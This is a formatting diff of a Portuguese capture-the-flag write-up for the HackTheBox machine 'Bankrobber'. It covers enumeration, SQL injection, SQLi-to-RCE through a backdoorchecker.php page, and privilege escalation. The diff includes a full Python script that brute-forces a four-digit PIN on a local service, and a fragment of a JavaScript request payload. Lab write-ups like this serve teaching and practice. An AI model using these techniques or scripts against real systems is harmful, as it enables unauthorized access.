@@ -1,32 +1,36 @@
-1. [Resolução da máquina **Bankrobber**](#resolução-da-máquina-bankrobber) 1. [Máquina INSANE (hackthebox.com)](#máquina-insane-hacktheboxcom) 2. [by **_JavaliMZ_** - 13/09/2021](#by-javalimz---13092021)
-2. [Enumeração](#enumeração)
-    1. [Nmap](#nmap)
-    2. [WebSite](#website)
-    3. [SQLi](#sqli)
-    4. [note.txt](#notetxt)
-    5. [SQLi into RCE](#sqli-into-rce)
-    6. [Visualização do ficheiro backdoorchecker.php](#visualização-do-ficheiro-backdoorcheckerphp)
-3. [PrivEsc](#privesc)
-
 ![](Assets/HTB-Windows-Insane-Bankrobber/icon.webp)
 
 <img src="https://img.shields.io/badge/Bankrobber-HackTheBox-green?style=plastic" width="200">
 
-# Resolução da máquina **Bankrobber**
+<h1> Resolução da máquina <b>Bankrobber</b></h1>
 
-#### Máquina INSANE (hackthebox.com)
+<h4>Máquina INSANE (hackthebox.com)</h4>
 
-#### by **_JavaliMZ_** - 13/09/2021
+<h4>by <b><i>JavaliMZ</i></b> - 13/09/2021</h4>
+
+---
 
 ---
 
+- [1. Introdução](#1-introdução)
+- [2. Enumeração](#2-enumeração)
+  - [2.1. Nmap](#21-nmap)
+  - [2.2. WebSite](#22-website)
+  - [2.3. SQLi](#23-sqli)
+  - [2.4. note.txt](#24-notetxt)
+  - [2.5. SQLi into RCE](#25-sqli-into-rce)
+    - [2.5.1. Visualização do ficheiro backdoorchecker.php](#251-visualização-do-ficheiro-backdoorcheckerphp)
+- [3. PrivEsc](#3-privesc)
+
 ---
+
+# 1. Introdução
 
 Esta máquina é uma boa máquina para ter noção de como pode uma sequência de falhas levar a comprometer uma máquina. Assim como um examplo que se pode encontrar em BugBounty. Mas existe um Senão!! **A MÁQUINA É EXTRAMAMENTE INSTÁVEL!**. Tive bastante dificuldade em replicar o que se vê na net para resolver a máquina!! Mas Percebi muitas coisinhas que irei partilhar pelo caminho.
 
-# Enumeração
+# 2. Enumeração
 
-## Nmap
+## 2.1. Nmap
 
 Assim como em todas as máquinas, a fase inicial é a fase de enumeração. E nesta fase, enumeramos sempre em primeiro lugar as portas activas da máquina... São os pontos de entrada, por isso temos obrigação de saber todos os pontos de entrada para só depois ver que tipo de falhas poderá haver.
 
@@ -41,7 +45,7 @@ A primeira vista, nada de extraordinário. Mas mesmo assim á pontos importantes
 -   Existe um Samba server. (Não nos vai ser de nenhuma utilidade. Mas numa situação real, é perciso fazer testes nele também)
 -   Existe um servidor mysql-MariaDB (A partir dai sempre será necessário testar SQLi pelo site a fora)
 
-## WebSite
+## 2.2. WebSite
 
 ![Página inicial](Assets/HTB-Windows-Insane-Bankrobber/Pagina_Inicial_Login-E-coin.png)
 
@@ -115,7 +119,7 @@ Esta página está também bastante cru, e já dá para planear coisas.
 
 Existem dois campos, 1 que diz ID, e outro que diz Command onde no seu comentário diz que podemos rodar um dir com quaisquer argumentos... Isto já cheira a frito...
 
-## SQLi
+## 2.3. SQLi
 
 Vamos abordar por enquanto apenas o campo ID.
 
@@ -174,7 +178,7 @@ Isto aqui não é nada comodo... Não quiz fazer um script em python, mas ainda 
 
 Voltaremos mais tarde a este assunto, porque ainda faltam dados acerca deste puzzle!
 
-## note.txt
+## 2.4. note.txt
 
 Na página de administrador existe uma hiperligação para um note.txt
 
@@ -182,7 +186,7 @@ Na página de administrador existe uma hiperligação para um note.txt
 
 Nessas notas podemos ver que o servidor Web é feito com Xampp, e fala novamente no localhost...
 
-## SQLi into RCE
+## 2.5. SQLi into RCE
 
 Neste ponto temos de fazer um break e expor as informações que temos:
 
@@ -203,7 +207,7 @@ Sabemos que:
 
 Agora sim temos um pouco de tudo. O ficheiro que nos interessa ver para ver que tipo de filtros existe é o backdoorchecker.php. Que por sua vez se encontra provavelmente em C:\xampp\htdocs\admin\backdoorchecker.php por ser a path de instalação padrão (C:\xampp\htdocs) e o resto vê-se na Request URL da própria petição que fizemos
 
-### Visualização do ficheiro backdoorchecker.php
+### 2.5.1. Visualização do ficheiro backdoorchecker.php
 
 Este ficheiro é um php o que pode trazer alguns problemas, pois ao ser transferido pode ser interpretado antes de nós podemos visualizar o código fonte. Então para se ver tudo, existe em SQL uma função para converter uma string em base64. A petição foi feita em curl para não ficar tudo deformado, e depois é só descodificá-lo:
 
@@ -236,7 +240,7 @@ request.send(params)
 
 ![In the target machine](Assets/HTB-Windows-Insane-Bankrobber/in-the-target-machine.png)
 
-# PrivEsc
+# 3. PrivEsc
 
 Depois de um café, vamos enumerar um pouco a máquina.
 
@@ -298,34 +302,34 @@ from pwn import log
 
 
 def tryPin(pin, p1):
-	p1.status(f"Testando com PIN {pin.strip()}")
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.connect(("127.0.0.1",910))
-	s.recv(4098)
-	s.send(bytes(pin.encode()))
-	msg = s.recv(4098).decode()
+    p1.status(f"Testando com PIN {pin.strip()}")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect(("127.0.0.1",910))
+    s.recv(4098)
+    s.send(bytes(pin.encode()))
+    msg = s.recv(4098).decode()
 
-	if not "Access denied" in msg:
-		p1.success(f"PIN encontrado. O PIN correcto é o: {pin.strip()}")
-		sys.exit(0)
+    if not "Access denied" in msg:
+        p1.success(f"PIN encontrado. O PIN correcto é o: {pin.strip()}")
+        sys.exit(0)
 
 
 def getListOfPins():
-	pins = []
-	for first_num in range(0,10):
-		for second_num in range(0,10):
-			for third_num in range(0,10):
-				for fourth_num in range(0,10):
-					pin = str(first_num) + str(second_num) + str(third_num) + str(fourth_num)
-					pins.append(pin + "\n")
-	return pins
+    pins = []
+    for first_num in range(0,10):
+        for second_num in range(0,10):
+            for third_num in range(0,10):
+                for fourth_num in range(0,10):
+                    pin = str(first_num) + str(second_num) + str(third_num) + str(fourth_num)
+                    pins.append(pin + "\n")
+    return pins
 
 
 def main():
-	p1 = log.progress("Brute Force")
-	pins = getListOfPins()
-	for pin in pins:
-		tryPin(pin, p1)
+    p1 = log.progress("Brute Force")
+    pins = getListOfPins()
+    for pin in pins:
+        tryPin(pin, p1)
 
 
 main()
